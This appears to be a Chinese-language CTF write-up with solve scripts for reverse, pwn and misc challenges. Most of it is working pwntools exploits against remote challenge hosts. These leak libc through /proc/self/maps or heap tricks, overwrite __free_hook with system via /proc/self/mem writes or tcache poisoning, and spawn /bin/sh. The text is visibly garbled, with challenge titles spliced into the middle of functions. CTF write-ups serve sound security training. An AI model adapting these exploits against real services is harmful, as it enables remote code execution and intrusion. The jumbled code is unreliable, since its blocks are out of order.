    15925590
]
keys = bytes(map(lambda x: (x-17382)//331421, keylist))
key = keys[32:].unhex()
iv = keys[:32].unhex()
c = 
base64.b64decode('8QAUFzIzw0gtrLeRUpesieQJDC6jxCujTszwcj/I9nU1h3J5LlMBcUS38IO5AH
RY')
aes = AES.new(key, AES.MODE_CBC, iv)
print(aes.decrypt(c))
check1 95  13500
check3 171  58800
check5 32  47692
check7 101  58123
check9  185  50625
check11  184  9372
check13  36  18815
check15  160  40643
check17  15  30579
check19  207  51164
check21  226  64164
check23   9  18342
check25  232  48184
lua:
拼在一起解线性模方程组即可。
check27  109  45041
check29  170  49115
check31  176  4982
check33   116  33482
check35  213   25450
check37  149  18426
check39  19  31357
check41  5   38929
k = [220, 39, 4, 137, 211, 238, 133, 179, 158, 40, 196, 248, 157, 163, 167, 159, 
29, 93, 8, 81, 181]
sum = [16047, 18580, 1520, 8828, 53648, 32347, 45053, 14264, 25879, 7217, 17903, 
46799, 55445, 11450, 11581, 50599, 38986, 39558, 61814, 41021, 19105]
import re
from Crypto.Util.number import inverse
with open('check.lua', 'r') as f:
    content = f.read()
lib = '''check1 95  13500
check3 171  58800
check5 32  47692
check7 101  58123
check9  185  50625
check11  184  9372
check13  36  18815
check15  160  40643
check17  15  30579
check19  207  51164
check21  226  64164
check23   9  18342
check25  232  48184
check27  109  45041
check29  170  49115
check31  176  4982
check33   116  33482
check35  213   25450
check37  149  18426
check39  19  31357
check41  5   38929'''
ks = list(map(int, re.findall(r'local k = (\\d+)\\n', content)))
sums = list(map(int, re.findall(r'sum == (\\d+) then', content)))
print(len(ks))
for line in lib.splitlines():
    _, tmpk, tmpsum = line.strip().split()
    ks.append(int(tmpk))
    sums.append(int(tmpsum))
print(ks)
print(sums)
PWN
fsplayground
读maps泄露地址，改mem来getshell
k = [220, 39, 4, 137, 211, 238, 133, 179, 158, 40, 196, 248, 157, 163, 167, 159, 
29, 93, 8, 81, 181, 95, 171, 32, 101, 185, 184, 36, 160, 15, 207, 226, 9, 232, 
109, 170, 176, 116, 213, 149, 19, 5]
s = [16047, 18580, 1520, 8828, 53648, 32347, 45053, 14264, 25879, 7217, 17903, 
46799, 55445, 11450, 11581, 50599, 38986, 39558, 61814, 41021, 19105, 13500, 
58800, 47692, 58123, 50625, 9372, 18815, 40643, 30579, 51164, 64164, 18342, 
48184, 45041, 49115, 4982, 33482, 25450, 18426, 31357, 38929]
length = len(k)
a = []
for i in range(21):
    tmp = []
    for j in range(length):
        tmp.append(pow(k[i],j,65537))
    a.append(tmp)
for i in range(21,42):
    tmp = []
    for j in range(length):
        tmp.append(pow(k[i],j+1,65537))
    a.append(tmp)
A = matrix(GF(65537), a)
b = matrix(GF(65537), s).transpose()
print(''.join(map(lambda x: chr(x[0]), list(A.solve_right(b))))[::-1])
from pwn import *
# p = process('./fsplayground')
p = remote('119.3.111.133', 6666)
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# context.log_level = 'debug'
def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])
def open_file(i,s):
    p.recvuntil('choice:')
    p.sendline('1')
    p.recvuntil('Filename:')
    p.sendline(i)
    p.recvuntil('Option:')
    p.sendline(str(s))
def close_file():
    p.recvuntil('choice:')
    p.sendline('2')
def seek_file(i):
    p.recvuntil('choice:')
    p.sendline('3')
    p.recvuntil('Offset: ')
    p.sendline(str(i))
unknown
def read_file(i):
    p.recvuntil('choice:')
    p.sendline('4')
    p.recvuntil('Size: ')
    p.sendline(str(i))
def write_file(i,c):
    p.recvuntil('choice:')
    p.sendline('5')
    p.recvuntil('Size: ')
    p.sendline(str(i))
    p.recvuntil('Content: ')
    p.send(c)
open_file('/proc/self/maps\x00',0)
read_file(0x1000)
r = p.recvuntil('6. exit').splitlines()
find = ''
for i in r:
    if 'libc-2.27.so' in i and 'r-xp' in i:
        find = i
        break
print(find)
libc_addr = int(find[:12],16)
log.info(hex(libc_addr))
close_file()
open_file('/proc/self/mem\x00',1)
seek_file(libc_addr+l.symbols['__free_hook']-8)
write_file(0x10,'/bin/sh\x00' + p64(libc_addr+l.symbols['system']))
p.interactive()
malloc的时候有负数溢出，可以改到data_size从而让edit的时候堆溢出
from pwn import *
# p = process('./unknown')
p = remote('122.112.212.41', 6666)
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'
def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])
def add(i,s):
    p.recvuntil('choice:')
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(i))
    p.recvuntil('Size:')
    p.sendline(str(s))
def edit(i,s):
    p.recvuntil('choice:')
veryeasy
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(i))
    sleep(0.5)
    p.send(s)
def show(i):
    p.recvuntil('choice:')
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(i))
    p.recvuntil('Content: ')
def dele(i):
    p.recvuntil('choice:')
    p.sendline('4')
    p.recvuntil('Index:')
    p.sendline(str(i))
add(15,0)
add(0,0x1f0)
for _ in xrange(10):
    add(_+1,0xf0)
add(-1,0)
edit(15,p8(0) * 0x18 + p64(0x501) + '\n')
dele(0)
add(0,0x1f0)
show(1)
leak_libc = u64(p.recv(6)+'\x00\x00') - 4111520
log.info(hex(leak_libc))
add(13,0xf0)
add(14,0xf0)
dele(14)
dele(13)
edit(1,p64(leak_libc + l.symbols['__free_hook'])+'\n')
add(14,0xf0)
add(13,0xf0)
edit(13,p64(leak_libc + l.symbols['system'])+'\n')
edit(14,'/bin/sh\x00'+'\n')
dele(14)
p.interactive()
from pwn import *
# s = process("./pwn")
# s = process("./pwn",aslr=False,env={"LD_PRELOAD":"./libc-2.27.so"})
def add(idx,size,buf):
    s.sendlineafter("Your choice :","1")
    s.sendlineafter("id:",str(idx))
    s.sendlineafter("please input your size:",str(size))
    s.sendafter("content:",buf)
def free(idx):
    s.sendlineafter("Your choice :","3")
Misc
whitespace
    s.sendlineafter("id:",str(idx))
def edit(idx,buf):
    s.sendlineafter("Your choice :","2")
    s.sendlineafter("id:",str(idx))
    s.sendafter("content:",buf)
while True:
    try:
        s = remote("122.112.225.164","10001")
        add(1,0xf0,'1')#8
        free(1)#7
        free(1)#6
        add(2,0xe0,'1')#5
        free(2)#4
        free(2)#3
        edit(2,p16(0x7010))#2
        edit(1,p16(0x7010))#1
        add(3,0xf0,'1')#0
        add(4,0xf0,p64(0)*4+'\xff'*(8*4))#3
        edit(4,p64(0)*4+'\xff'*(8*4))
        edit(4,p64(0)*4+'\xff'*(8*4))
        edit(4,p64(0)*4+'\xff'*(8*4))
        edit(4,p64(0)*4+'\xff'*(8*4))
        free(4)#0
        edit(4,p16(0x7760))
        add(5,0xe0,'1')
        add(6,0xe0,'1')
        payload = p64(0xfbad3884)+p64(0)*3+'\xc8'
        add(7,0xe0,payload)
        s.recvline()
        tmp = u64(s.recv(8))
        libc = ELF("./libc-2.27.so")
        offset = tmp-libc.sym['_IO_2_1_stdin_']
        success(hex(offset))
        free_hook = offset+libc.sym['__free_hook']
        system = offset+libc.sym['system']
        edit(4,p64(free_hook)*16)
        add(9,0x30,p64(system))
        # gdb.attach(s,"b *$rebase(0xe8a)\nc")
        edit(5,'/bin/sh\x00;')
        free(5)
        s.interactive()
    except:
        continue
张三的恶行
/mnt文件夹下发现有个raid5文件夹，查看/proc/mdstat发现存在inactive的raid5，重建后使用出题人
提前准备好的extundelete工具恢复即可。
with open('whitespace', 'r') as f:
    content = f.readlines()
flag = ''
for line in content[0:len(content)-3:2]:
    flag += chr(int(line[-9:-1].replace('\t', '1').replace(' ', '0'), 2))
print(flag)
mdadm --assemble --force /dev/md5 /dev/sd[bcde]
extundelete /dev/md5 --restore-all
cat RECOVERED_FILES/CMS/flag